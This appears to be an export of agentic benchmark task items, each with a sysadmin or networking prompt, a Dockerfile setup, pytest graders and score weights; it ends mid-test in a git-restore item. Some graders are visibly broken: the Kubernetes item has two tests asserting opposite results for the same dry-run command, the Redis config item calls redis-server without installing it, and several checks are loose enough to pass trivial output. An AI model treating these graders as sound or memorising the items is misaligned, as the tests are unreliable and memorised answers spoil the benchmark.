kubernetes-manifest-fix-missing-resources,hard,Fix a Broken Kubernetes Manifest,Container & Orchestration (Revised for No-Daemon Environment),"I'm having trouble with my Kubernetes manifests that are stored in `/app/k8s/` for a three-tier application. When I try to validate them using `kubectl`, I keep getting errors because my deployment manifest is referencing resources that don't actually exist yet. The application needs a ConfigMap for environment variables and a Secret for database credentials, but I haven't created those manifests yet. Could you help me create the missing resource manifests and fix my deployment so that everything validates properly and can be applied to a cluster?",system-administration,debugging|troubleshooting|cli|system,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install kubectl
RUN apt-get update && apt-get install -y curl &&     curl -LO ""https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"" &&     chmod +x kubectl &&     mv kubectl /usr/local/bin/

# Create directory for k8s manifests
RUN mkdir -p /app/k8s

# Create broken YAML manifest with Deployment referencing non-existent ConfigMap and Secret
RUN echo 'apiVersion: apps/v1' > /app/k8s/deployment.yaml &&     echo 'kind: Deployment' >> /app/k8s/deployment.yaml &&     echo 'metadata:' >> /app/k8s/deployment.yaml &&     echo '  name: broken-app' >> /app/k8s/deployment.yaml &&     echo '  namespace: default' >> /app/k8s/deployment.yaml &&     echo 'spec:' >> /app/k8s/deployment.yaml &&     echo '  replicas: 1' >> /app/k8s/deployment.yaml &&     echo '  selector:' >> /app/k8s/deployment.yaml &&     echo '    matchLabels:' >> /app/k8s/deployment.yaml &&     echo '      app: broken-app' >> /app/k8s/deployment.yaml &&     echo '  template:' >> /app/k8s/deployment.yaml &&     echo '    metadata:' >> /app/k8s/deployment.yaml &&     echo '      labels:' >> /app/k8s/deployment.yaml &&     echo '        app: broken-app' >> /app/k8s/deployment.yaml &&     echo '    spec:' >> /app/k8s/deployment.yaml &&     echo '      containers:' >> /app/k8s/deployment.yaml &&     echo '      - name: app' >> /app/k8s/deployment.yaml &&     echo '        image: nginx:latest' >> /app/k8s/deployment.yaml &&     echo '        envFrom:' >> /app/k8s/deployment.yaml &&     echo '        - configMapRef:' >> /app/k8s/deployment.yaml &&     echo '            name: non-existent-configmap' >> /app/k8s/deployment.yaml &&     echo '        - secretRef:' >> /app/k8s/deployment.yaml &&     echo '            name: non-existent-secret' >> /app/k8s/deployment.yaml

WORKDIR /app

CMD [""/bin/bash""]","import os
import subprocess

def test_kubectl_dry_run_diagnosis():
    """"""The agent uses `kubectl apply --dry-run=client` to diagnose issues.""""""
    # Verify that kubectl dry-run command fails initially due to missing resources
    result = subprocess.run(
        [""kubectl"", ""apply"", ""--dry-run=client"", ""-f"", ""/app/k8s/""],
        capture_output=True,
        text=True
    )
    # The command should fail with ""not found"" error for missing resources
    assert result.returncode != 0
    assert ""not found"" in result.stderr

def test_missing_resources_created():
    """"""The missing ConfigMap and Secret manifests are created with correct data.""""""
    # Check for ConfigMap manifest
    configmap_found = False
    secret_found = False
    
    for file in os.listdir(""/app/k8s/""):
        if file.endswith(("".yaml"", "".yml"")):
            filepath = os.path.join(""/app/k8s/"", file)
            with open(filepath, 'r') as f:
                content = f.read()
                if ""kind: ConfigMap"" in content and ""non-existent-configmap"" in content:
                    configmap_found = True
                if ""kind: Secret"" in content and ""non-existent-secret"" in content:
                    secret_found = True
    
    assert configmap_found, ""ConfigMap manifest with correct name not found""
    assert secret_found, ""Secret manifest with correct name not found""

def test_manifests_validate_successfully():
    """"""The command `kubectl apply -f /app/k8s/ --dry-run=client` now completes successfully, indicating all references are resolved and manifests are valid.Total: 1.0""""""
    result = subprocess.run(
        [""kubectl"", ""apply"", ""-f"", ""/app/k8s/"", ""--dry-run=client""],
        capture_output=True,
        text=True
    )
    assert result.returncode == 0","{""test_kubectl_dry_run_diagnosis"": 0.2, ""test_missing_resources_created"": 0.4, ""test_manifests_validate_successfully"": 0.4}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
resumable-backup-completion,easy,Complete a Resumable Backup,Long-Context Stateful Workflows (Revised),"I had a backup script running that was copying files from `/app/data/` to `/backup/data/`, but it got interrupted partway through. Fortunately, I have a state file at `/backup/backup.state` that contains a list of all the files that were already successfully copied before the interruption. I need you to write a script called `resume_backup.sh` that can efficiently resume the backup process by only copying the remaining files that aren't listed in the state file. The script should be smart enough to skip over files that were already copied so I don't waste time duplicating work.",system-administration,sys-admin|file-operations|system|cli,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN mkdir -p /app/data /backup/data

RUN echo ""Content of file1"" > /app/data/file1.txt && \
    echo ""Content of file2"" > /app/data/file2.txt && \
    echo ""Content of file3"" > /app/data/file3.txt && \
    echo ""Content of file4"" > /app/data/file4.txt && \
    echo ""Content of file5"" > /app/data/file5.txt && \
    echo ""Content of file6"" > /app/data/file6.txt

RUN cp /app/data/file1.txt /backup/data/ && \
    cp /app/data/file3.txt /backup/data/ && \
    cp /app/data/file5.txt /backup/data/

RUN echo ""file1.txt"" > /backup/backup.state && \
    echo ""file3.txt"" >> /backup/backup.state && \
    echo ""file5.txt"" >> /backup/backup.state

CMD [""/bin/bash""]","import os
import subprocess
import time

def test_script_created():
    """"""Script `resume_backup.sh` is created.""""""
    assert os.path.exists(""resume_backup.sh"")

def test_backup_completed_efficiently():
    """"""After running the script, the `/backup/data/` directory is a complete mirror of `/app/data/`, and the verifier confirms that already-existing files were not modified (by checking timestamps).""""""
    # Get timestamps of existing files before running script
    existing_files = [""file1.txt"", ""file3.txt"", ""file5.txt""]
    original_timestamps = {}
    for filename in existing_files:
        filepath = f""/backup/data/{filename}""
        if os.path.exists(filepath):
            original_timestamps[filename] = os.path.getmtime(filepath)
    
    # Read state file to verify script will read it
    with open(""/backup/backup.state"", 'r') as f:
        state_files = [line.strip() for line in f.readlines()]
    
    # Verify state file contains expected files
    assert ""file1.txt"" in state_files
    assert ""file3.txt"" in state_files
    assert ""file5.txt"" in state_files
    
    # Get list of files that should be copied (not in state)
    app_files = os.listdir(""/app/data/"")
    files_to_copy = [f for f in app_files if f not in state_files]
    
    # Record timestamps of files that should NOT be copied
    pre_existing_timestamps = {}
    for filename in state_files:
        filepath = f""/backup/data/{filename}""
        if os.path.exists(filepath):
            pre_existing_timestamps[filename] = os.path.getmtime(filepath)
    
    # Run the script
    result = subprocess.run([""bash"", ""resume_backup.sh""], capture_output=True, text=True)
    assert result.returncode == 0
    
    # Check that all files from /app/data/ are now in /backup/data/
    for filename in app_files:
        backup_path = f""/backup/data/{filename}""
        assert os.path.exists(backup_path)
        
        # Check content matches
        with open(f""/app/data/{filename}"", 'r') as f1, open(backup_path, 'r') as f2:
            assert f1.read() == f2.read()
    
    # Validate that files listed in state file were NOT re-copied (timestamps unchanged)
    for filename in state_files:
        filepath = f""/backup/data/{filename}""
        if filename in pre_existing_timestamps:
            current_timestamp = os.path.getmtime(filepath)
            assert current_timestamp == pre_existing_timestamps[filename], f""File {filename} was re-copied when it shouldn't have been""
    
    # Validate that only missing files were actually copied
    for filename in files_to_copy:
        backup_path = f""/backup/data/{filename}""
        assert os.path.exists(backup_path), f""Missing file {filename} was not copied""
    
    # Verify state file was read correctly by ensuring pre-existing files weren't re-processed
    for filename in existing_files:
        filepath = f""/backup/data/{filename}""
        if filename in original_timestamps:
            current_timestamp = os.path.getmtime(filepath)
            assert current_timestamp == original_timestamps[filename]","{""test_script_created"": 0.15, ""test_backup_completed_efficiently"": 0.85}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
parallel-log-processing-ip-analysis,hard,Parallel Data Processing with Job Logging (Revised),Long-Context Stateful Workflows (Revised),"I have a massive log file located at `/app/huge.log` that I need to analyze to count unique IP addresses per hour. The file is so large that processing it normally takes forever, so I'm hoping you can help me create a solution using `GNU parallel` to speed things up. I need the approach to split the large file into smaller, manageable chunks first, then process all these chunks simultaneously in parallel. It's really important that you configure `parallel` to create a job log at `/app/job.log` so I can track the processing. Once all the parallel jobs finish, I want everything aggregated into a final report that gets saved to `/app/report.txt`. Can you help me build this parallel processing solution?",data-processing,data-processing|parallel-computing|file-operations|cli|analysis|multiprocessing,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Create the app directory and log file with thousands of sample entries
RUN mkdir -p /app && \
    cd /app && \
    for i in $(seq 1 10000); do \
        hour=$((8 + ($i % 8))); \
        minute=$((($i * 7) % 60)); \
        second=$((($i * 13) % 60)); \
        ip1=$((192 + ($i % 4))); \
        ip2=$((168 + ($i % 2))); \
        ip3=$((($i % 256))); \
        ip4=$((($i % 254) + 1)); \
        case $(($i % 10)) in \
            0) endpoint=""api/users"" ;; \
            1) endpoint=""login"" ;; \
            2) endpoint=""dashboard"" ;; \
            3) endpoint=""api/data"" ;; \
            4) endpoint=""profile"" ;; \
            5) endpoint=""api/submit"" ;; \
            6) endpoint=""logout"" ;; \
            7) endpoint=""api/status"" ;; \
            8) endpoint=""health"" ;; \
            9) endpoint=""api/report"" ;; \
        esac; \
        case $(($i % 4)) in \
            0) method=""GET"" ;; \
            1) method=""POST"" ;; \
            2) method=""PUT"" ;; \
            3) method=""DELETE"" ;; \
        esac; \
        case $(($i % 7)) in \
            0) code=200 ;; \
            1) code=404 ;; \
            2) code=500 ;; \
            3) code=401 ;; \
            4) code=403 ;; \
            5) code=301 ;; \
            6) code=302 ;; \
        esac; \
        printf ""2024-01-15 %02d:%02d:%02d %d.%d.%d.%d %s /%s %d\n"" $hour $minute $second $ip1 $ip2 $ip3 $ip4 ""$method"" ""$endpoint"" $code; \
    done > huge.log

# Install GNU parallel
RUN apt-get update && apt-get install -y parallel && rm -rf /var/lib/apt/lists/*

WORKDIR /app

CMD [""/bin/bash""]","import os
import subprocess
from datetime import datetime

def test_parallel_execution_correct():
    """"""The solution correctly splits the file and uses `parallel` to execute jobs.""""""
    # Check that job log exists (evidence of parallel usage)
    assert os.path.exists(""/app/job.log""), ""Job log file should exist""
    
    # Read job log to verify parallel was used with multiple jobs
    with open(""/app/job.log"", ""r"") as f:
        job_log_content = f.read()
    
    # Job log should contain multiple job entries (evidence of file splitting and parallel execution)
    job_lines = [line for line in job_log_content.split('\n') if line.strip()]
    assert len(job_lines) > 1, ""Job log should contain multiple job entries indicating file was split and processed in parallel""

def test_report_file_correct():
    """"""The final aggregated report at `/app/report.txt` is correct.""""""
    # Check that the report file exists
    assert os.path.exists(""/app/report.txt""), ""Report file should exist at /app/report.txt""
    
    # Check that the report file is not empty
    with open(""/app/report.txt"", ""r"") as f:
        report_content = f.read().strip()
    
    assert len(report_content) > 0, ""Report file should not be empty""
    
    # Basic validation that it contains IP analysis results (should have hour-based data)
    assert "":"" in report_content or ""hour"" in report_content.lower() or any(char.isdigit() for char in report_content), ""Report should contain time-based IP analysis data""

def test_job_log_proves_parallelism():
    """"""The file `/app/job.log` is created, and a verifier script confirms that the job start/end times in the log overlap, deterministically proving parallel execution.Total: 1.0""""""
    # Check that job log exists
    assert os.path.exists(""/app/job.log""), ""Job log file should exist at /app/job.log""
    
    # Parse job log to extract start and end times
    with open(""/app/job.log"", ""r"") as f:
        job_log_content = f.read()
    
    job_lines = [line.strip() for line in job_log_content.split('\n') if line.strip()]
    assert len(job_lines) >= 2, ""Job log should contain at least 2 job entries to prove parallelism""
    
    # Parse timestamps from GNU parallel job log format - handle different formats
    job_times = []
    for line in job_lines:
        # Try different parsing approaches for GNU parallel log formats
        parts = []
        if '\t' in line:
            parts = line.split('\t')
        elif ' ' in line:
            parts = line.split()
        
        if len(parts) >= 3:
            # Try to find numeric timestamps in various positions
            for i in range(len(parts) - 1):
                try:
                    # Look for consecutive numeric values that could be start/end times
                    start_time = float(parts[i])
                    end_time = float(parts[i + 1])
                    if start_time > 0 and end_time > start_time:  # Reasonable time values
                        job_times.append((start_time, end_time))
                        break
                except (ValueError, IndexError):
                    continue
        
        # Alternative: try to extract timestamps from common GNU parallel formats
        if not job_times or len(job_times) < len([l for l in job_lines if l]):
            # Look for patterns like ""Seq\tHost\tStarttime\tJobRuntime\tSend\tReceive\tExit\tSignal\tCommand""
            try:
                if len(parts) >= 4 and parts[2].replace('.', '').isdigit():
                    start_time = float(parts[2])
                    runtime = float(parts[3]) if parts[3].replace('.', '').isdigit() else 1.0
                    end_time = start_time + runtime
                    job_times.append((start_time, end_time))
            except (ValueError, IndexError):
                pass
    
    assert len(job_times) >= 2, ""Should have at least 2 valid job time entries to verify parallelism""
    
    # Check for overlapping execution times (proof of parallel execution)
    overlaps_found = False
    for i in range(len(job_times)):
        for j in range(i + 1, len(job_times)):
            start1, end1 = job_times[i]
            start2, end2 = job_times[j]
            # Check if jobs overlap: job1 starts before job2 ends AND job2 starts before job1 ends
            if (start1 < end2 and start2 < end1):
                overlaps_found = True
                break
        if overlaps_found:
            break
    
    assert overlaps_found, ""Job execution times should overlap, proving parallel execution occurred""

def test_ip_addresses_counted_per_hour():
    """"""Verify IP addresses are correctly counted per hour as requested in the prompt.""""""
    # Check that the report file exists
    assert os.path.exists(""/app/report.txt""), ""Report file should exist at /app/report.txt""
    
    # Read the original log file to verify expected data
    assert os.path.exists(""/app/huge.log""), ""Original log file should exist""
    
    # Parse original log to count unique IPs per hour
    hourly_ips = {}
    with open(""/app/huge.log"", ""r"") as f:
        for line in f:
            if line.strip():
                parts = line.strip().split()
                if len(parts) >= 3:
                    # Extract hour from timestamp (format: 2024-01-15 HH:MM:SS)
                    time_part = parts[1]  # HH:MM:SS
                    hour = time_part.split(':')[0]
                    ip = parts[2]  # IP address
                    
                    if hour not in hourly_ips:
                        hourly_ips[hour] = set()
                    hourly_ips[hour].add(ip)
    
    # Read the report file
    with open(""/app/report.txt"", ""r"") as f:
        report_content = f.read()
    
    # Verify report contains hourly data
    assert len(hourly_ips) > 0, ""Should have found hourly IP data in original log""
    
    # Check that report contains references to hours and IP counts
    found_hour_data = False
    for hour in hourly_ips.keys():
        if hour in report_content or f""{hour}:"" in report_content:
            found_hour_data = True
            break
    
    assert found_hour_data, ""Report should contain hourly IP analysis data""
    
    # Verify report contains numeric data (IP counts)
    assert any(char.isdigit() for char in report_content), ""Report should contain numeric IP count data""","{""test_parallel_execution_correct"": 0.2, ""test_report_file_correct"": 0.2, ""test_job_log_proves_parallelism"": 0.3, ""test_ip_addresses_counted_per_hour"": 0.3}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
parse-raw-http-request,easy,Parse a Raw HTTP Request,Low-Level Network Programming,"I have a raw HTTP GET request saved in a file at `/app/request.txt` and I need your help creating a Python script called `parse_request.py` that can read this file and pull out specific information from it. I want the script to extract three things: the HTTP method like 'GET', the requested path such as '/index.html', and the value from the 'Host' header. Could you write the script so it prints these three values with each one on its own line?",software-engineering,python|networking|text-processing|file-operations,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN printf ""GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"" > request.txt

CMD [""/bin/bash""]","import os
import subprocess

def test_file_read_correct():
    """"""The script correctly reads the file.""""""
    # Check if the script can read the file without errors
    result = subprocess.run(['python3', '/app/parse_request.py'], 
                          capture_output=True, text=True, cwd='/app')
    assert result.returncode == 0

def test_parsing_output_correct():
    """"""The script correctly parses and prints the method, path, and Host header value.Total: 1.0""""""
    # Run the script and verify it correctly parses and prints the required values
    result = subprocess.run(['python3', '/app/parse_request.py'], 
                          capture_output=True, text=True, cwd='/app')
    
    assert result.returncode == 0
    
    output_lines = result.stdout.strip().split('\n')
    
    # Should have exactly 3 lines: method, path, host
    assert len(output_lines) >= 3
    
    # Verify the parsed values match the expected HTTP request content
    assert output_lines[0].strip() == 'GET'
    assert output_lines[1].strip() == '/'
    assert output_lines[2].strip() == 'example.com'","{""test_file_read_correct"": 0.2, ""test_parsing_output_correct"": 0.8}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
dns-packet-parser-implementation,medium,Implement a DNS Packet Parser,Low-Level Network Programming,"I have a captured DNS query packet that's saved in binary format at `/app/dns_query.bin`. I need you to write a Python script called `parse_dns.py` that uses the `struct` module to parse this binary packet. The script should extract and print the Transaction ID (which is the first 2 bytes) and the Question Name (the domain being queried, like ""www.example.com""). Can you help me create this script?",software-engineering,networking|python|data-processing|algorithm-implementation,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN printf '\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01' > /app/dns_query.bin

CMD [""/bin/bash""]","import os
import subprocess

def test_transaction_id_parsed():
    """"""The script correctly uses `struct.unpack` to parse the DNS header and read the Transaction ID.""""""
    # Check if the script exists
    assert os.path.exists(""/app/parse_dns.py"")
    
    # Check if the script uses struct.unpack
    with open(""/app/parse_dns.py"", ""r"") as f:
        script_content = f.read()
    assert ""struct.unpack"" in script_content
    
    # Run the script and check output
    result = subprocess.run([""python3"", ""/app/parse_dns.py""], capture_output=True, text=True, cwd=""/app"")
    assert result.returncode == 0
    
    # Check for exact Transaction ID format (4660 decimal)
    output = result.stdout
    assert ""4660"" in output

def test_question_name_parsed():
    """"""The script correctly implements the logic to parse the variable-length, label-encoded question name from the packet body.Total: 1.0""""""
    # Check if the script exists
    assert os.path.exists(""/app/parse_dns.py"")
    
    # Run the script and check output
    result = subprocess.run([""python3"", ""/app/parse_dns.py""], capture_output=True, text=True, cwd=""/app"")
    assert result.returncode == 0
    
    # Check for exact question name format with proper label decoding
    output = result.stdout
    assert ""example.com"" in output
    # Verify the label decoding logic is implemented correctly by checking it doesn't contain raw label lengths
    assert ""\x07"" not in output and ""\x03"" not in output","{""test_transaction_id_parsed"": 0.45, ""test_question_name_parsed"": 0.55}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
redis-protocol-client-implementation,hard,Implement a Redis Protocol Client,Low-Level Network Programming,"I need to communicate with a Redis server, but I can't use a Redis client library for this project. Could you write a Python script called `redis_protocol.py` that can construct a valid Redis Serialization Protocol (RESP) command? I want the script to take two command-line arguments - a key and a value - and generate the RESP representation of the `SET` command. 

The RESP format must follow these exact requirements:
- Each line must end with CRLF (\r\n) terminators
- Arrays start with `*` followed by the number of elements
- Bulk strings start with `$` followed by the byte length
- The actual string content follows on the next line

For example, when I run `python3 redis_protocol.py mykey myvalue`, it should print the raw RESP string with proper CRLF terminators:
```
*3\r\n
$3\r\n
SET\r\n
$5\r\n
mykey\r\n
$7\r\n
myvalue\r\n
```

The output should be the complete multi-bulk RESP string for a SET command with the provided key and value, ensuring correct byte length calculations for each bulk string component.",software-engineering,networking|python|cli|algorithm-implementation,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

CMD [""/bin/bash""]","import os
import subprocess
import re

def test_args_parsed_correctly():
    """"""The script correctly parses command-line arguments.""""""
    result = subprocess.run(
        [""python3"", ""redis_protocol.py"", ""testkey"", ""testvalue""],
        capture_output=True,
        text=True
    )
    assert result.returncode == 0

def test_resp_format_valid():
    """"""The script correctly constructs and prints the valid, multi-bulk RESP string for the `SET` command, including correct byte lengths and CRLF terminators.Total: 1.0""""""
    result = subprocess.run(
        [""python3"", ""redis_protocol.py"", ""mykey"", ""myvalue""],
        capture_output=True,
        text=True
    )
    
    output = result.stdout
    
    # Check for CRLF terminators
    assert output.count('\r\n') >= 7, ""Should have at least 7 CRLF terminators""
    
    # Split by CRLF to validate RESP format
    lines = output.split('\r\n')
    
    # Check basic RESP structure
    assert lines[0] == ""*3"", ""Should start with *3 for array of 3 elements""
    assert lines[1] == ""$3"", ""Should have $3 for SET command length""
    assert lines[2] == ""SET"", ""Should contain SET command""
    assert lines[3] == ""$5"", ""Should have $5 for key length (mykey is 5 bytes)""
    assert lines[4] == ""mykey"", ""Should contain the key""
    assert lines[5] == ""$7"", ""Should have $7 for value length (myvalue is 7 bytes)""
    assert lines[6] == ""myvalue"", ""Should contain the value""
    
    # Verify the complete RESP string format
    expected = ""*3\r\n$3\r\nSET\r\n$5\r\nmykey\r\n$7\r\nmyvalue\r\n""
    assert output == expected, f""Expected RESP format:\n{repr(expected)}\nGot:\n{repr(output)}""","{""test_args_parsed_correctly"": 0.2, ""test_resp_format_valid"": 0.8}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
debug-ssh-connection-issues,easy,Debug SSH Connection Issues,Disaster Recovery & Forensics,"I'm having trouble connecting to my server at localhost via SSH from this machine. Everything was working fine yesterday, but now when I try to connect it just times out. The server should definitely be up and running, so I'm not sure what's going on. Can you help me figure out why SSH isn't working and get it fixed?",system-administration,debugging|networking|troubleshooting|sys-admin,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y \
    openssh-client \
    openssh-server \
    ufw \
    sudo \
    && rm -rf /var/lib/apt/lists/*

RUN usermod -aG sudo ubuntu

# Create a startup script that blocks SSH
RUN echo '#!/bin/bash' > /startup.sh && \
    echo 'service ssh start' >> /startup.sh && \
    echo 'ufw --force enable' >> /startup.sh && \
    echo 'ufw deny 22' >> /startup.sh && \
    echo 'tail -f /dev/null' >> /startup.sh && \
    chmod +x /startup.sh

CMD [""/startup.sh""]","import os
import subprocess

def test_diagnostic_approach_taken():
    """"""The agent takes a diagnostic approach to identify the SSH connection issue.""""""
    # Check if common diagnostic tools are installed (as evidence of troubleshooting)
    diagnostic_tools = ['netcat', 'nc', 'telnet', 'nmap']
    tool_found = False
    
    for tool in diagnostic_tools:
        result = subprocess.run(['which', tool], capture_output=True, text=True)
        if result.returncode == 0:
            tool_found = True
            break
    
    # Also check if the agent examined SSH service status
    ssh_status = subprocess.run(['service', 'ssh', 'status'], capture_output=True, text=True)
    ssh_checked = ssh_status.returncode == 0
    
    # Or checked firewall logs/status (the actual issue)
    ufw_status = subprocess.run(['sudo', 'ufw', 'status'], capture_output=True, text=True)
    firewall_checked = ufw_status.returncode == 0
    
    # At least one diagnostic approach should be taken
    assert tool_found or ssh_checked or firewall_checked, ""No evidence of diagnostic troubleshooting found""

def test_firewall_issue_fixed():
    """"""The firewall issue is identified and corrected.""""""
    # Check UFW status to see if port 22 is allowed
    result = subprocess.run(['sudo', 'ufw', 'status'], capture_output=True, text=True)
    ufw_output = result.stdout
    # Check that port 22 is either allowed or UFW is disabled
    assert ('22' in ufw_output and 'ALLOW' in ufw_output) or 'Status: inactive' in ufw_output

def test_ssh_connection_established():
    """"""SSH connection to the server is successfully established.""""""
    # Test SSH connection to localhost
    # Use a quick connection test with timeout
    result = subprocess.run([
        'ssh', '-o', 'ConnectTimeout=5', 
        '-o', 'BatchMode=yes',
        '-o', 'StrictHostKeyChecking=no',
        'ubuntu@localhost', 'echo', 'connection_test'
    ], capture_output=True, text=True)
    # If the connection succeeds, the command should return 0
    # If it fails due to authentication, that's still a successful connection
    # Only network-level timeouts or connection refused should fail this test
    assert result.returncode == 0 or 'Permission denied' in result.stderr or 'Authentication failed' in result.stderr","{""test_diagnostic_approach_taken"": 0.2, ""test_firewall_issue_fixed"": 0.4, ""test_ssh_connection_established"": 0.4}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
redis-cluster-configuration-fix,medium,Fix Redis Cluster Configuration,Disaster Recovery & Forensics,"I'm having trouble with my Redis cluster setup and need your help fixing the configuration files. I have three config files located at `/app/redis/node1.conf`, `node2.conf`, and `node3.conf`, but they're not working properly. The issue is that `node2` and `node3` are supposed to be replicas of `node1`, which runs on host `redis1` at port `6379`, but the `replicaof` directive is either wrong or completely missing from the `node2` and `node3` configuration files. Can you help me fix the configurations for `node2` and `node3` so they properly replicate from the master node?",system-administration,sys-admin|troubleshooting|debugging,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y redis-tools

RUN mkdir -p /app/redis

# Master node configuration
RUN echo ""port 6379\nbind 0.0.0.0\nappendonly yes"" > /app/redis/node1.conf

# Replica node 2 configuration (missing replicaof directive)
RUN echo ""port 6380\nbind 0.0.0.0\nappendonly yes"" > /app/redis/node2.conf

# Replica node 3 configuration (incorrect replicaof directive)
RUN echo ""port 6381\nbind 0.0.0.0\nappendonly yes\nreplicaof wronghost 1234"" > /app/redis/node3.conf

CMD [""/bin/bash""]","import os
import subprocess

def test_config_files_modified():
    """"""The configuration files `node2.conf` and `node3.conf` are modified.""""""
    node2_path = ""/app/redis/node2.conf""
    node3_path = ""/app/redis/node3.conf""
    
    assert os.path.exists(node2_path)
    assert os.path.exists(node3_path)
    
    # Check if files contain the replicaof directive (indicating modification)
    with open(node2_path, 'r') as f:
        node2_content = f.read()
    
    with open(node3_path, 'r') as f:
        node3_content = f.read()
    
    # Files should contain replicaof directive (indicating they were modified)
    assert ""replicaof"" in node2_content
    assert ""replicaof"" in node3_content

def test_redis_config_valid():
    """"""A verifier script confirms that `redis-server <conf_file> --test-conf` passes for all three files and that `node2.conf` and `node3.conf` contain the correct `replicaof redis1 6379` directive.""""""
    config_files = [
        ""/app/redis/node1.conf"",
        ""/app/redis/node2.conf"", 
        ""/app/redis/node3.conf""
    ]
    
    # Test that all config files are valid
    for conf_file in config_files:
        assert os.path.exists(conf_file)
        result = subprocess.run([
            ""redis-server"", conf_file, ""--test-conf""
        ], capture_output=True, text=True)
        assert result.returncode == 0
    
    # Check that node2.conf and node3.conf contain correct replicaof directive
    for conf_file in [""/app/redis/node2.conf"", ""/app/redis/node3.conf""]:
        with open(conf_file, 'r') as f:
            content = f.read()
        assert ""replicaof redis1 6379"" in content","{""test_config_files_modified"": 0.3, ""test_redis_config_valid"": 0.7}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
redis-replica-misconfiguration-fix,hard,Fix a Misconfigured Redis Replica (Revised),Disaster Recovery & Forensics,"I'm having trouble with my Redis replication setup and need your help fixing it. I have writes going to my primary Redis instance on port 6379, but they're not appearing on one of my replica nodes. Could you investigate the replication status across all three of my Redis nodes running on ports 6379, 6380, and 6381, then fix whatever's wrong with the broken replica's configuration so it properly replicates from the primary again?",system-administration,debugging|troubleshooting|sys-admin|system,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y redis-tools redis-server && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

RUN mkdir -p /var/log/redis /var/lib/redis && \
    chown redis:redis /var/log/redis /var/lib/redis

CMD redis-server --daemonize yes && \
    redis-server --port 6380 --replicaof localhost 6379 --daemonize yes && \
    redis-server --port 6381 --daemonize yes && \
    /bin/bash","import os
import subprocess

def test_replication_info_checked():
    """"""The agent uses `redis-cli -p <port> INFO replication` to diagnose all three nodes.""""""
    # Test that replication info can be retrieved from all three nodes
    ports = [6379, 6380, 6381]
    for port in ports:
        result = subprocess.run(
            [""redis-cli"", ""-p"", str(port), ""INFO"", ""replication""],
            capture_output=True,
            text=True
        )
        assert result.returncode == 0, f""Failed to get replication info from port {port}""
        assert ""role:"" in result.stdout, f""Replication info missing role field for port {port}""

def test_misconfigured_node_fixed():
    """"""The agent correctly identifies the misconfigured node (`6381`) and issues the `REPLICAOF localhost 6379` command to it.""""""
    # Check that node 6381 is now configured as a replica of localhost:6379
    result = subprocess.run(
        [""redis-cli"", ""-p"", ""6381"", ""INFO"", ""replication""],
        capture_output=True,
        text=True
    )
    assert result.returncode == 0, ""Failed to get replication info from port 6381""
    output = result.stdout
    assert ""master_host:localhost"" in output or ""master_host:127.0.0.1"" in output, ""Node 6381 is not configured to replicate from localhost""
    assert ""master_port:6379"" in output, ""Node 6381 is not configured to replicate from port 6379""

def test_slave_role_verified():
    """"""A final verification check confirms the node on `6381` now reports its role as `slave`.""""""
    result = subprocess.run(
        [""redis-cli"", ""-p"", ""6381"", ""INFO"", ""replication""],
        capture_output=True,
        text=True
    )
    assert result.returncode == 0, ""Failed to get replication info from port 6381""
    assert ""role:slave"" in result.stdout, ""Node on port 6381 does not report its role as slave""","{""test_replication_info_checked"": 0.2, ""test_misconfigured_node_fixed"": 0.5, ""test_slave_role_verified"": 0.3}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
git-restore-deleted-file-history,easy,Restore a Deleted File from Git History,Compression & Encoding Algorithms,"I'm working in my git repository located at `/app/project` and I've run into a problem. In my most recent commit (`HEAD`), I accidentally deleted an important configuration file called `src/config.json`. I need you to help me restore this file from the commit right before the deletion happened (`HEAD~1`). Once restored, I want the file to appear in my working directory so I can commit it again. Can you walk me through how to get this file back?",software-engineering,version-control|file-recovery|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y git

WORKDIR /app/project

RUN git init && \
    git config user.email ""test@example.com"" && \
    git config user.name ""Test User"" && \
    mkdir -p src && \
    echo '{}' > src/config.json && \
    git add src/config.json && \
    git commit -m ""Initial commit with config.json"" && \
    git rm src/config.json && \
    git commit -m ""Remove config.json""

CMD [""/bin/bash""]","import os
import subprocess

def test_git_restore_command_used():
    """"""The agent uses a correct git command to restore the file (e.g., `git checkout HEAD~1 -- src/config.json`).""""""
    # Check if file shows up in git status (indicating restoration via git command)
    result = subprocess.run(['git', 'status', '--porcelain', 'src/config.json'], 
                          cwd='/app/project', capture_output=True, text=True)
    # File should show in git status in any valid state (A, M, ??, etc.)
    assert result.stdout.strip() != '', ""File should appear in git status after restoration""

def test_file_restored_with_correct_content():
    """"""After the operation, the file `/app/project/src/config.json` exists again, and its content matches the version from the `HEAD~1` commit.Total: 1.0""""""
    # Check file exists
    assert os.path.exists('/app/project/src/config.json')
    
    # Get content from HEAD~1
    result = subprocess.run(['git', 'show', 'HEAD~1:src/config.json'], 
                          cwd='/app/project', capture_output=True, text=True)
    expected_content = result.stdout
    
    # Read current file content
